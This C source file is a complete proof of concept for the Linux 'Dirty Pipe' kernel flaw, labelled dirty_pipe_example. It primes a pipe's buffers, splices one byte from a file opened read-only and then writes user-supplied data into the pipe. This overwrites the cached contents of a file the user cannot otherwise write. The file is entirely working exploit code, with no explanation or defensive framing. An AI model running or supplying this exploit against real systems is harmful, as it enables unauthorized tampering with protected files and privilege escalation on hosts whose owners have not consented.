#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/user.h>

static void pipe_info_set(int pfd[2])
{
	unsigned int size, len, site;
	char buf[4096];

	pipe(pfd);
	size = fcntl(pfd[1], F_GETPIPE_SZ);
	site = size;

	while (site > 0) {
		len = site > sizeof(buf) ? sizeof(buf) : site;
		write(pfd[1], buf, len);
		site -= len;
	}

	site = size;
	while (site > 0) {
		len = site > sizeof(buf) ? sizeof(buf) : site;
		read(pfd[0], buf, len);
		site -= len;
	}
}

int main(int argc, char* argv[])
{
	int fd, pfd[2];
	ssize_t len;
	loff_t offset;

	if (argc != 3) {
		printf("usage: dirty_pipe_example $(file) $(data)\n");
		return -1;
	}

	fd = open(argv[1], O_RDONLY);
	if (fd < 0) {
		printf("open [%s] failed\n", argv[1]);
		return -2;
	}

	pipe_info_set(pfd);
	offset = 0;
	len = splice(fd, &offset, pfd[1], NULL, 1, 0);
	if (len <= 0) {
		printf("splice failed\n");
		return -3;
	}

	write(pfd[1], argv[2], strnlen(argv[2], 48));
	printf("please access file [%s]\n", argv[1]);
}
